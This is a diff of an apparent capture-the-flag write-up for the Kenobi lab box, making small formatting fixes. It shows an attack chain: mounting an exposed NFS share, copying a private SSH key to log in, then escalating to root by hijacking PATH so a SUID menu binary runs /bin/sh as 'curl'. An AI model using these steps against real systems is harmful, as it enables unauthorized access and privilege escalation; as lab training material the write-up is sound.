@@ -17,15 +17,16 @@ Tasks:
        1. `mkdir /mnt/kenobiNFS`
           `mount machine_ip:/var /mnt/kenobiNFS`
           `ls -la /mnt/kenobiNFS`
-       2. `cp /mnt/kenobiNFS/tmp/id_rsa . `
+       2. `cp /mnt/kenobiNFS/tmp/id_rsa .`
        3. `ssh -i id_rsa kenobi@ip`
     4. `cat /home/kenobi/user.txt` and submit user flag&#x20;
 
+    
 4. Privilege Escalation with Path Variable Manipulation:
    1. Find binaries with suid bit set using `find / -perm -u=s -type f 2>/dev/null` 
    2. /usr/bin/menu seems looks out of ordinary
    3. Using strings on menu , we find that curl is called without full path ,So we can copy /bin/sh as curl to tmp path and export tmp path using `echo /bin/sh > /tmp/curl`  , `chmod 777 /tmp/curl` , `export PATH=/tmp:$PATH` 
-   4. Now run /usr/bin/menu and select option 1 , you will get root shell._
+   4. Now run /usr/bin/menu and select option 1 , you will get root shell.
    5. `cat /root/root.txt` and submit root flag.
 
 
